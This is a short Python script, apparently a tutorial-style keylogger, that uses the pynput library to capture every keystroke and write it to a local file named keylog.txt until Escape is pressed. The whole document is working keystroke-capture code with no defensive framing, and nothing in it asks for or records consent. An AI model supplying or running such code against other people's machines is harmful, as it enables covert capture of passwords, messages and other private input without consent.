import pynput
from pynput.keyboard import Key, Listener

# The file to save the keystrokes
log_file = "keylog.txt"

# Initialize a string to store the keystrokes
keystrokes = ""

# Function to handle when a key is pressed
def on_press(key):
    global keystrokes
    try:
        keystrokes += key.char
    except AttributeError:
        if key == Key.space:
            keystrokes += " "
        elif key == Key.enter:
            keystrokes += "\n"
        else:
            keystrokes += f" [{key}] "

    # Write keystrokes to file
    with open(log_file, "w") as file:
        file.write(keystrokes)

# Function to handle when a key is released
def on_release(key):
    # Stop listener if the escape key is pressed
    if key == Key.esc:
        return False

# Start listening to the keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
